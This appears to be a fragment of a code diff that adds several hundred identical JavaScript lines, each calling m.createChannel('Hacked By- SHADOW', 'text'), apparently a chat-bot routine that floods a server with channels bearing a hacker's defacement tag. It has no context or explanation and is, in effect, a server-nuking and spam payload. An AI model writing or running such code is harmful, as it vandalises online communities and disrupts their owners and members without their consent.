+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
+m.createChannel('Hacked By- SHADOW', 'text');
